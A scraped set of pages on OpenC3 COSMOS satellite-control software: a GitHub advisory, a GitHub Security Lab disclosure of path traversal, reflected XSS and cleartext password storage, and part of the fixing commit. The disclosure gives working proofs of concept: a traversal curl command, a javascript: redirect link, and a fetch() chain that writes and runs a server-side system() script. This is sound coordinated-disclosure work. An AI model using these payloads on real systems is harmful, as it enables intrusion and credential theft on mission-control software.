=== Content from github.com_8481a32f_20250111_165201.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fsecurity%2Fadvisories%2FGHSA-4xqv-47rm-37mm)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fsecurity%2Fadvisories%2FGHSA-4xqv-47rm-37mm)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=OpenC3%2Fcosmos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenC3](/OpenC3)
/
**[cosmos](/OpenC3/cosmos)**
Public

* [Notifications](/login?return_to=%2FOpenC3%2Fcosmos) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2FOpenC3%2Fcosmos)
* [Star
   117](/login?return_to=%2FOpenC3%2Fcosmos)

* [Code](/OpenC3/cosmos)
* [Issues
  212](/OpenC3/cosmos/issues)
* [Pull requests
  4](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects
  1](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

Additional navigation options

* [Code](/OpenC3/cosmos)
* [Issues](/OpenC3/cosmos/issues)
* [Pull requests](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

# Clear text storage of password/token (`GHSL-2024-129`)

Moderate

[ryanmelt](/ryanmelt)
published
GHSA-4xqv-47rm-37mm
Oct 2, 2024

## Package

bundler

openc3
([RubyGems](/advisories?query=ecosystem%3Arubygems))

## Affected versions

< 5.19.0

## Patched versions

5.19.0

## Description

### Summary

OpenC3 COSMOS stores the password of a user unencrypted in the LocalStorage of a web browser. This makes the user password susceptible to exfiltration via Cross-site scripting (see GHSL-2024-128).

Note: This CVE only affects Open Source edition, and not OpenC3 COSMOS Enterprise Edition

### Impact

This issue may lead to Information Disclosure.

### Severity

Moderate

### CVE ID

CVE-2024-47529

### Weaknesses

[CWE-312](/advisories?query=cwe%3A312)

### Credits

* [![@p-](https://avatars.githubusercontent.com/u/176818?s=40&v=4)](/p-)
  [p-](/p-)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_f64e76a2_20250111_165202.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 17, 2024
# GHSL-2024-127\_GHSL-2024-129: Remote Code Execution (RCE) via Cross-Site Scripting (XSS) in OpenC3 COSMOS - CVE-2024-43795, CVE-2024-46977, CVE-2024-47529

[![Author avatar](https://avatars.githubusercontent.com/u/176818)
Peter Stöckli](https://github.com/p-)

## Coordinated Disclosure Timeline

* 2024-07-01: Vulnerabilities were reported via GitHub’s [private vulnerability reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability) feature.
* 2024-08-23: CVE was assigned to the Cross-site scripting vulnerability by the OpenC3 maintainers.
* 2024-10-02: OpenC3 COSMOS [v5.19.0](https://github.com/OpenC3/cosmos/releases/tag/v5.19.0) was published with fixes for and advisories ([CVE-2024-46977](https://github.com/OpenC3/cosmos/security/advisories/GHSA-8jxr-mccc-mwg8), [CVE-2024-43795](https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g), [CVE-2024-47529](https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm)) for the reported vulnerabilities.

## Summary

Several vulnerabilities were found in [OpenC3 COSMOS](https://openc3.com/), a web application that is used to control satellites and test equipment. They can lead up to Remote Code Execution (RCE) via cross-site scripting (XSS).

Following issues are part of this report:

* Issue 1: Path traversal via screen controller (`GHSL-2024-127`)
* Issue 2: Cross-site scripting in Login functionality (`GHSL-2024-128`)
* Issue 3: Clear text storage of password/token (`GHSL-2024-129`)

## Project

OpenC3 COSMOS

## Tested Version

[v5.16.2](https://github.com/OpenC3/cosmos/releases/tag/v5.16.2)

## Details

### Issue 1: Path traversal via screen controller (`GHSL-2024-127`)

A path traversal vulnerability inside of `LocalMode`’s `open_local_file` method allowed an authenticated user with adequate permissions to download any `.txt` via the `ScreensController#show` on the web server COSMOS is running on (depending on the file permissions).

The user-controlled parameters `target` and `screen` flow from ScreensController’s [`show`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-cmd-tlm-api/app/controllers/screens_controller.rb#L27) method:

```
  def show
    return unless authorization('system')
    screen = Screen.find(*params.require([:scope, :target, :screen]))
[..]

```

into the [`self.find`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-cmd-tlm-api/app/models/screen.rb#L39) class method of `Screen`:

```
def self.find(scope, target, screen)
    name = screen.split('*')[0].downcase # Split '*' that indicates modified - Filenames are lowercase
    body(scope, "#{target}/screens/#{name}.txt")
end

```

In this method the parameters are joined to a partial path separated by the folder `screens` and terminated by the extension `.txt`.
This partial path then flows into the [`self.body`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3/lib/openc3/utilities/target_file.rb#L92) class method of `TargetFile`:

```
def self.body(scope, name)
  name = name.split('*')[0] # Split '*' that indicates modified
  # First try opening a potentially modified version by looking for the modified target
  if ENV['OPENC3_LOCAL_MODE']
    local_file = OpenC3::LocalMode.open_local_file(name, scope: scope)
    return local_file.read if local_file
  end
[..]

```

This class method then calls [`self.open_local_file`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3/lib/openc3/utilities/local_mode.rb#L393) in `LocalMode` if the env variable `OPENC3_LOCAL_MODE` is set to `1` (the default):

```
def self.open_local_file(path, scope:)
  full_path = "#{OPENC3_LOCAL_MODE_PATH}/#{scope}/targets_modified/#{path}"
  return File.open(full_path, 'rb')
[..]

```

There the path gets joined again and then flows into a `File.open` sink.

This vulnerability was discovered with the help of CodeQL’s [Uncontrolled data used in path expression](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/) query.

#### Proof of concept

Putting the different path strings from above together, gives us roughly following pattern:

```
full_path = "/plugins/DEFAULT/targets_modified/#{params[:target]}/screens/#{params[:name]}.txt"
return File.open(full_path, 'rb')

```

The default values for `OPENC3_LOCAL_MODE_PATH` and scope are used. The URL parameters `params[:target]` and `params[:screen]` are user-controllable. Both have to be properly fed for this path traversal to be exploitable: While the initial path `/plugins/DEFAULT/targets_modified/` exists on the COSMOS docker image, no subfolder named `screens` exists in this folder. Due to Linux being [fairly unforgiving](https://x.com/ulldma/status/1086249703497453568) when traversing paths a folder named `screens` has to exist somewhere. On the COSMOS docker image a folder named `screens` exists inside of `/openc3/templates/target/targets/TARGET/`. That means the URL parameter `target` needs to be used to get into that folder. The URL parameter `screen` can then be used to get to any `.txt` file.

So to fetch the file at `/openc3/python/requirements.txt` following values have to be passed to the URL parameters:

```
target = "../../../../../../openc3/templates/target/targets/TARGET"
screen = "../../../../../../openc3/python/requirements"

```

Put together as a curl command this would look like this:

```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization: <cosmos-token>' -H $'User-Agent: Mozilla/5.0' -H $'Accept: text/html' \
    $'https://<cosmos-host>/openc3-api/screen/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopenc3%2ftemplates%2ftarget%2ftargets%2fTARGET/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopenc3%2fpython%2frequirements?scope=DEFAULT'

```

(The values for `<cosmos-host>` and `<cosmos-token>` need to be replaced.)

#### Impact

This issue may lead to Information Disclosure.

### Issue 2: Cross-site scripting in Login functionality (`GHSL-2024-128`)

The login functionality of OpenC3 COSMOS (OSS Edition) contained a reflected cross-site scripting (XSS) vulnerability in [Login.vue](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue). An attacker can specify a malicious `redirect` query parameter to trigger the vulnerability. If a JavaScript URL is passed to the `redirect` parameter the attacker provided JavaScript will be executed after the user entered their password and clicked on login.

The redirect query parameter flows unchecked [from](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L145):

```
const redirect = new URLSearchParams(window.location.search).get(
      'redirect',
)

```

into the `window.location` [sink](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L148):

```
window.location = decodeURI(redirect || '/')

```

This URL needs to be accessed by a user who can reach the COSMOS instance. So an attacker might redirect a user to this URL (e.g. via Phishing email, redirect from a malicious website).

This vulnerability was discovered with the help of CodeQL’s [Client-side cross-site scripting](https://codeql.github.com/codeql-query-help/javascript/js-xss/) query.

#### Proof of concept

An attacker can send the following link to a victim, who will login:

```
https://<cosmos-host>/login?redirect=javascript:alert(localStorage.openc3Token)

```

For sake of demonstration, the password of the user will be displayed in an alert. Arbitrary javascript can be executed by the attacker in the context of the victim’s session.

Due the possibility of executing code inside the script runner instance an attacker also has the possibility of creating a JavaScript which will lead to code/command execution on the server side. For example, following JavaScript creates the script `testc4.rb` with the content `system('id > /tmp/pwned4.txt')` on the server. And then calls the endpoint to run this script, which will lead to the creation of the file `/tmp/pwned4.txt` inside of the script runner.

```
fetch("/script-api/scripts/testc4.rb?scope=DEFAULT", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": localStorage.openc3Token
        },
        body: "{\"text\":\"system('id > /tmp/pwned4.txt')\"}"
    })
    .then(data => {
        fetch("/script-api/scripts/testc4.rb/run?scope=DEFAULT", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": localStorage.openc3Token
                },
                body: "{}"
            }).then(console.log("Script executed"))
    });

```

So a more powerful proof of concept that executes code on the server instance of the script runner would look like this:

```
https://<cosmos-host>/login?redirect=javascript:fetch(%22/script-api/scripts/testc5.rb?scope=DEFAULT%22,%7Bmethod:%20%22POST%22,headers:%20%7B%22Content-Type%22:%20%22application/json%22,%22Authorization%22:%20localStorage.openc3Token%7D,body:%20%22%7B%5C%22text%5C%22:%5C%22system('id%20%3E%20/tmp/pwned5.txt')%5C%22%7D%22%7D).then(data%20=%3E%20%7Bfetch(%22/script-api/scripts/testc5.rb/run?scope=DEFAULT%22,%20%7Bmethod:%20%22POST%22,headers:%20%7B%22Content-Type%22:%20%22application/json%22,%22Authorization%22:%20localStorage.openc3Token%7D,body:%20%22%7B%7D%22%7D).then(console.log(%22Script%20executed%22))%7D);

```
#### Impact

This issue may lead up to Remote Code Execution (RCE).

### Issue 3: Clear text storage of password/token (`GHSL-2024-129`)

OpenC3 COSMOS (OSS Edition) stored the password of a user unencrypted in the LocalStorage of a web browser. This makes the user password susceptible to exfiltration via Cross-site scripting (see GHSL-2024-128) - This could get an attacker a more permanent foothold in the COSMOS instance; assuming the COSMOS instance is accessible to the attacker. The same is true for a local attacker who could access the local storage directly (in contrast to stealing a session-id that automatically expires after some time).

[Login](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L144) function in Login.vue where the password of the user is stored in the local storage of the browser:

```
login: function () {
  localStorage.openc3Token = this.password

```

This vulnerability was discovered with the help of CodeQL’s [Clear text storage of sensitive information](https://codeql.github.com/codeql-query-help/javascript/js-clear-text-storage-of-sensitive-data/) query.

#### Proof of concept

An attacker can send the following link to a victim, who will login. Instead of displaying the password/token in an alert box the attacker could send the token to a remote server under their control. (This proof of concept makes use of the XSS vulnerability described in `GHSL-2024-128`)

```
https://<cosmos-host>/login?redirect=javascript:alert(localStorage.openc3Token)

```
#### Impact

This issue may lead to Information Disclosure.

## CVE

* CVE-2024-43795 - GHSL-2024-128
* CVE-2024-46977 - GHSL-2024-127
* CVE-2024-47529 - GHSL-2024-129

## Credit

These issues were discovered and reported by GHSL team member [@p- (Peter Stöckli)](https://github.com/p-).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-127`, `GHSL-2024-128`, or `GHSL-2024-129` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_4b240c0d_20250111_165201.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fcommit%2Fb5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fcommit%2Fb5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=OpenC3%2Fcosmos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenC3](/OpenC3)
/
**[cosmos](/OpenC3/cosmos)**
Public

* [Notifications](/login?return_to=%2FOpenC3%2Fcosmos) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2FOpenC3%2Fcosmos)
* [Star
   117](/login?return_to=%2FOpenC3%2Fcosmos)

* [Code](/OpenC3/cosmos)
* [Issues
  212](/OpenC3/cosmos/issues)
* [Pull requests
  4](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects
  1](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

Additional navigation options

* [Code](/OpenC3/cosmos)
* [Issues](/OpenC3/cosmos/issues)
* [Pull requests](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

## Commit

[Permalink](/OpenC3/cosmos/commit/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Switch to session token based auth

[Browse files](/OpenC3/cosmos/tree/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7)
Browse the repository at this point in the history

* Loading branch information

[![@ryanmelt](https://avatars.githubusercontent.com/u/184686?s=40&v=4)](/ryanmelt)

[ryanmelt](/OpenC3/cosmos/commits?author=ryanmelt "View all commits by ryanmelt")
committed
Sep 30, 2024

1 parent
[a34e61a](/OpenC3/cosmos/commit/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b)

commit b5ab34f

 Show file tree

 Hide file tree

Showing
**5 changed files**
with
**47 additions**
and
**13 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* openc3-cosmos-cmd-tlm-api/app/controllers

  + openc3-cosmos-cmd-tlm-api/app/controllers/auth\_controller.rb
    [auth\_controller.rb](#diff-bd822f6ee65cea1365f459ac107bd6e4e809d75432b13ed487415e57c497a229)
  + openc3-cosmos-cmd-tlm-api/app/controllers/users\_controller.rb
    [users\_controller.rb](#diff-90fef4c0e59aed8d9e4b9471ed40e1e3031cd6f5433fd5f529b8146a5ea38549)
* openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components

  + openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue
    [Login.vue](#diff-4161d4d5ce5e41e4dd7907f87a62047dc08a129704448515722c45a58a87cd17)
* openc3-cosmos-script-runner-api/app/controllers

  + openc3-cosmos-script-runner-api/app/controllers/scripts\_controller.rb
    [scripts\_controller.rb](#diff-7939ce69e0a2a27415df5f84e8f27d1640c08c031f71a703ab60e893df91e7d3)
* openc3/lib/openc3/models

  + openc3/lib/openc3/models/auth\_model.rb
    [auth\_model.rb](#diff-0e23e07224728a50714e8ef02ab09be38aef214ead1734e8247691c2d897410f)

## There are no files selected for viewing

6 changes: 4 additions & 2 deletions

6
[openc3-cosmos-cmd-tlm-api/app/controllers/auth\_controller.rb](#diff-bd822f6ee65cea1365f459ac107bd6e4e809d75432b13ed487415e57c497a229 "openc3-cosmos-cmd-tlm-api/app/controllers/auth_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7/openc3-cosmos-cmd-tlm-api/app/controllers/auth_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -34,11 +34,12 @@ def token\_exists |
|  |  | def verify |
|  |  | begin |
|  |  | if OpenC3::AuthModel.verify(params[:token]) |
|  |  | head :ok |
|  |  | render :plain => OpenC3::AuthModel.generate\_session() |
|  |  | else |
|  |  | head :unauthorized |
|  |  | end |
|  |  | rescue StandardError => e |
|  |  | OpenC3::Logger.error(e.formatted) |
|  |  | render :json => { :status => 'error', :message => e.message, 'type' => e.class }, :status => 500 |
|  |  | end |
|  |  | end |
| Expand All | | @@ -48,8 +49,9 @@ def set |
|  |  | # Set throws an exception if it fails for any reason |
|  |  | OpenC3::AuthModel.set(params[:token], params[:old\_token]) |
|  |  | OpenC3::Logger.info("Password changed", user: username()) |
|  |  | head :ok |
|  |  | render :plain => OpenC3::AuthModel.generate\_session() |
|  |  | rescue StandardError => e |
|  |  | OpenC3::Logger.error(e.formatted) |
|  |  | render :json => { :status => 'error', :message => e.message, 'type' => e.class }, :status => 500 |
|  |  | end |
|  |  | end |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[openc3-cosmos-cmd-tlm-api/app/controllers/users\_controller.rb](#diff-90fef4c0e59aed8d9e4b9471ed40e1e3031cd6f5433fd5f529b8146a5ea38549 "openc3-cosmos-cmd-tlm-api/app/controllers/users_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7/openc3-cosmos-cmd-tlm-api/app/controllers/users_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -26,6 +26,7 @@ def active() |
|  |  | end |
|  |  |  |
|  |  | def logout() |
|  |  | OpenC3::AuthModel.logout |
|  |  | head :ok |
|  |  | end |
|  |  | end |
| Expand Down | |  |

12 changes: 7 additions & 5 deletions

12
[openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue](#diff-4161d4d5ce5e41e4dd7907f87a62047dc08a129704448515722c45a58a87cd17 "openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue")

Show comments

[View file](/OpenC3/cosmos/blob/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -140,12 +140,12 @@ export default { |
|  |  | showReset: function () { |
|  |  | this.reset = true |
|  |  | }, |
|  |  | login: function () { |
|  |  | localStorage.openc3Token = this.password |
|  |  | login: function (response) { |
|  |  | localStorage.openc3Token = response.data |
|  |  | const redirect = new URLSearchParams(window.location.search).get( |
|  |  | 'redirect', |
|  |  | ) |
|  |  | if (redirect[0] === '/' && redirect[1] !== '/') { |
|  |  | if (redirect.startsWith('/tools/')) { |
|  |  | // Valid relative redirect URL |
|  |  | window.location = decodeURI(redirect) |
|  |  | } else { |
| Expand All | | @@ -161,7 +161,7 @@ export default { |
|  |  | ...this.options, |
|  |  | }) |
|  |  | .then((response) => { |
|  |  | this.login() |
|  |  | this.login(response) |
|  |  | }) |
|  |  | .catch((error) => { |
|  |  | this.alert = 'Incorrect password' |
| Expand All | | @@ -177,7 +177,9 @@ export default { |
|  |  | token: this.password, |
|  |  | }, |
|  |  | ...this.options, |
|  |  | }).then(this.login) |
|  |  | }).then((response) => { |
|  |  | this.login(response) |
|  |  | }) |
|  |  | }, |
|  |  | }, |
|  |  | } |
| Expand Down | |  |

8 changes: 4 additions & 4 deletions

8
[openc3-cosmos-script-runner-api/app/controllers/scripts\_controller.rb](#diff-7939ce69e0a2a27415df5f84e8f27d1640c08c031f71a703ab60e893df91e7d3 "openc3-cosmos-script-runner-api/app/controllers/scripts_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/b5ab34fe7fa54c0c8171c4aa3caf4e03d6f63bd7/openc3-cosmos-script-runner-api/app/controllers/scripts_controller.rb)
Edit file

Delete file

